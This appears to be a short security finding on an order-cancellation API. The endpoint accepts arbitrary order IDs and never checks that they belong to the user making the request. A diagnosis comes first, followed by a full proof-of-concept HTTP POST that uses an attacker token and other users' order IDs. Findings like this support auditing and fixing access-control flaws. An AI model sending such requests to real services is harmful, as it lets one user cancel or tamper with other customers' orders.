diagnosis: The bulk cancellation action accepts a list of order_ids directly from the request payload and updates their status in a single query without scoping the query to customer=request.user. An attacker can cancel any user's active orders by supplying arbitrary IDs.
exploit_request:
POST /api/orders/cancel-orders/ HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"order_ids": [1021, 1022, 1023]}
